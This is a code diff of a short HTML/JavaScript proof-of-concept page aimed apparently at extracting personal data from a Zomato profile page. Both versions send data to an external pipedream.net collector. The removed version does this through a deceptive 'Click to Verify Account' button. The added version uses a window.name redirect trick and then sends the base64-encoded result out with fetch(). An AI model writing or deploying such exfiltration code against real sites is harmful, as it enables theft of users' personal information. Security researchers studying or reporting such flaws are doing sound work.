@@ -1,11 +1,12 @@
-<html>
-    <body>
-        <script>
-            // If we are on the GitHub page, redirect to the PII page
-            if (window.location.hostname.includes("github.io")) {
-                window.location.href = "https://www.zomato.com/webroutes/getPage?page_url=/profile";
-            }
-        </script>
-        <button onclick="location.href='https://eomfuajl79ed6za.m.pipedream.net/leak'">Click to Verify Account</button>
-    </body>
-</html>
+<script>
+    if (window.name === "" || window.name === "init") {
+        // Step 1: Set the name and jump to the PII page
+        window.name = "waiting_for_data";
+        window.location.href = "https://www.zomato.com/webroutes/getPage?page_url=/profile";
+    } else {
+        // Step 3: We have returned from abc.com!
+        // We check if the PII leaked into the name or if we can fetch it now.
+        fetch('https://eomfuajl79ed6za.m.pipedream.net/?data_found=' + btoa(window.name));
+        document.body.innerHTML = "<h1>Data Captured Check Bin</h1>";
+    }
+</script>
